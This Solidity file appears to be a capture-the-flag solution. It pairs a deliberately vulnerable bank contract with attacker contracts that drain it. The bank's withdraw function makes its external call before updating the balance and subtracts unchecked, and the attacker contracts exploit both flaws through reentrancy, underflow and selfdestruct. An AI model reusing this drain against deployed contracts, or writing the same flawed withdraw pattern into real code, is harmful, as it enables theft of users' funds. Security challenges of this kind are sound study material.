// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.15;
import "forge-std/console.sol";

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

// https://ethereum.stackexchange.com/questions/29469/is-addressthis-a-valid-address-in-a-contracts-constructor
// in order to `receive` callback, we have to add a new contract and attack outside constructor
contract AttackerMiddle {
    address constant token = 0x5FbDB2315678afecb367f032d93F642f64180aa3;
    constructor() payable {
        try Security101(token).deposit{value: msg.value}() {} catch {}
    }

    function withdraw(uint i) internal {
        try Security101(token).withdraw(i) {} catch {}
    }

    fallback() external payable {
        if (msg.value == address(this).balance) {
            withdraw(block.number);
            if (msg.value == 0) {
                withdraw(10000 ether - 2);
                // selfdestruct(payable(tx.origin));
            }
        }
    }
}

// when selfdestruct, nothing would write to code, saving gas.
contract OptimizedAttackerSecurity101 {
    constructor(address token) payable {
        try Security101(address(new AttackerMiddle{value: block.number}())).deposit() {} catch {}
        selfdestruct(payable(tx.origin));
    }
}
